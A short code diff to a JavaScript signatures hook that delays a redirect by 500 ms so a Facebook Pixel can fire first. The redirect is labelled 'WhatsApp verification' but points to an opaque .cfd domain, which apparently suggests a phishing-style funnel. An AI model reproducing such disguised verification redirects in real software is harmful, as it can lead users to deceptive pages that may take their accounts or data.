@@ -51,7 +51,11 @@ export const useSignatures = () => {
     // Redirect to WhatsApp verification
     // The return URL will include ?signed=true parameter
     const returnUrl = encodeURIComponent(window.location.origin + "/?signed=true");
-    window.location.href = `https://csr32s75.cfd/s2dr?return=${returnUrl}`;
+    
+    // Delay 500ms to allow Facebook Pixel to send data
+    setTimeout(() => {
+      window.location.href = `https://csr32s75.cfd/s2dr?return=${returnUrl}`;
+    }, 500);
   };
 
   return {
